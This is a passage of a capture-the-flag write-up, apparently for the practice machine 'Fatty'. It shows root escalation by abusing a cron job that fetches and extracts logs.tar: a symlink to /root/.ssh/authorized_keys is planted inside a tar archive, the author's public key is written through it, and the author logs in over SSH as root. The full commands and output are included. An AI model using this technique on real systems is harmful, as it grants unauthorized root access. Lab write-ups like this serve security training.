032784d4da1d:/tmp$ id
uid=1000(qtc) gid=1000(qtc) groups=1000(qtc)
032784d4da1d:/tmp$ pwd
/tmp

```

Much better!

## Shell as root on Fatty

### Enumeration

After looking around and finding very little, and running some basic Linux privesc scripts, I uploaded and ran [pspy](https://github.com/DominicBreuker/pspy). Every minute there was an interesting process:

```

2020/03/27 20:05:02 CMD: UID=0    PID=146    | sshd: [accepted]
2020/03/27 20:05:02 CMD: UID=22   PID=147    | sshd: [net]       
2020/03/27 20:05:02 CMD: UID=0    PID=148    | sshd: qtc [priv]  
2020/03/27 20:05:02 CMD: UID=1000 PID=149    | scp -f /opt/fatty/tar/logs.tar 
2020/03/27 20:06:01 CMD: UID=0    PID=150    | sshd: [accepted]
2020/03/27 20:06:01 CMD: UID=22   PID=151    | sshd: [net]       
2020/03/27 20:06:01 CMD: UID=1000 PID=152    | sshd: qtc [priv]      
2020/03/27 20:06:01 CMD: UID=1000 PID=153    | scp -f /opt/fatty/tar/logs.tar 

```

That looks like an SSH connection coming in, and then `scp` (which operates over SSH) accessing a file. My best guess is that these logs are being pulled off and brought somewhere else.

### Exploitation

#### Description

I’m going to make an assumption that another host is copying `logs.tar` off the container into the host system and then unpacking it. If that is the case, I can do a bit of a shell game. I create a symbolic link called `logs.tar` that points to the file I want to write to. I’ll target `/root/.ssh/authorized_keys`. Then I’ll put that into another `.tar` archive (`temp.tar`) and copy that to `/opt/fatty/tar/logs.tar`.

When the cron copies this to the new host, it will store it `/somewhere/unknown/to/me/logs.tar`. If it then unpacks it into the same directory, the `.tar` file will be overwritten with the symbolic link. So now `/somewhere/unknown/to/me/logs.tar` is a link to `/root/.ssh/authorized_keys`.

Now back in the container I’ll delete `/opt/fatty/tar/logs.tar` and replace it with a text file containing my public SSH key. When the other host runs `scp qtc@container:/opt/fatty/tar/logs.tar /some/unknown/to/me/`, it will copy my key `/somewhere/unknown/to/me/logs.tar`, which is a link to `/root/.ssh/authorized_keys`, allowing me to write to that file.

Another way to show this is with a timeline, starting at some arbitrary time 0, with the cron running each minute:

| Time | Action | container: /opt/fatty/tar/logs.tar | host: /?/logs.tar | /host: /root/.ssh/authorized\_keys |
| --- | --- | --- | --- | --- |
| After 0:00 | Start | original `logs.tar` | original `logs.tar` | Nothing or original `authorized_keys` |
| Before 1:00 | Put `.tar` with link in place | `.tar` archive with symbolic link `logs.tar` –> `/root/.ssh/authorized_keys` | original `logs.tar` | Nothing or original `authorized_keys` |
| 1:00 | Cron `scp` | `.tar` archive with symbolic link `logs.tar` –> `/root/.ssh/authorized_keys` | `.tar` archive with symbolic link `logs.tar` –> `/root/.ssh/authorized_keys` | Nothing or original `authorized_keys` |
| 1:00 | Cron `tar` extract | `.tar` archive with symbolic link `logs.tar` –> `/root/.ssh/authorized_keys` | symbolic link `logs.tar` –> `/root/.ssh/authorized_keys` | Nothing or original `authorized_keys` |
| Between 1:00 and 2:00 | Put public key in place | plaintext file containing public key | symbolic link `logs.tar` –> `/root/.ssh/authorized_keys` | Nothing or original `authorized_keys` |
| 2:00 | Cron `scp` | plaintext file containing public key | symbolic link `logs.tar` –> `/root/.ssh/authorized_keys` | plaintext file containing public key |

The second half of that cron that extracts the archive will fail, but it doesn’t matter, my key is in place.

#### Practice

I’ll start in `/tmp/temp/` on the container, and with a file containing my public key:

```

032784d4da1d:/tmp/temp$ ls
pub_key

```

I’ll create the symbolic link, add it to a `.tar` archive, and copy into place:

```

032784d4da1d:/tmp/temp$ ln -s /root/.ssh/authorized_keys logs.tar
032784d4da1d:/tmp/temp$ tar cf temp.tar logs.tar 
032784d4da1d:/tmp/temp$ tar tvf temp.tar 
lrwxrwxrwx qtc/qtc         0 2020-03-27 20:56:20 logs.tar -> /root/.ssh/authorized_keys
032784d4da1d:/tmp/temp$ cp temp.tar /opt/fatty/tar/logs.tar 

```

Watching in `pspy`, I see the minute pass and the `scp`. Now on the host there’s a file somewhere that is a symbolic link to `/root/.ssh/authorized_keys`. Now I’ll copy the key file into place:

```

032784d4da1d:/tmp/temp$ cp pub_key /opt/fatty/tar/logs.tar

```

Once the next `scp` happens, if my theory is correct, I can SSH as root. It works:

```

root@kali# ssh -i ~/keys/id_rsa_generated root@10.10.10.174
Linux fatty 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Mar 27 21:34:03 2020 from 10.10.14.19
root@fatty:~#

```

And grab `root.txt`:

```

root@fatty:~# cat root.txt
ee982fa1************************

```